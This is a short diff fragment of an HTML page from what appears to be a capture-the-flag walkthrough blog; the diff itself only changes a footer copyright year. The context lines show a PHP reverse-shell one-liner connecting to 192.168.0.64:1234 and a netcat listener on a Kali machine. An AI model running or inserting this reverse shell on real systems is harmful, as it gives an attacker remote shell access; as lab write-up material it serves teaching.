+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">php</span> <span style="color:#f92672">-</span><span style="color:#a6e22e">r</span> <span style="color:#e6db74">&#39;$sock=fsockopen(&#34;192.168.0.64&#34;,1234);$proc=proc_open(&#34;/bin/sh -i&#34;, array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);&#39;</span>
 </code></pre></div><p>Now just wait for the connection.</p>
 <pre><code>┌──(root💀kali)-[/home/tiago]
 └─# rlwrap nc -nlvp 1234                                                                                                                                   
@@ -862,7 +861,7 @@ cat root.txt
         </article>
         <footer id="footer" class="main-content-wrap">
   <span class="copyrights">
-    &copy; 2020 Tiago Tavares. All Rights Reserved
+    &copy; 2021 Tiago Tavares. All Rights Reserved
   </span>
 </footer>
 
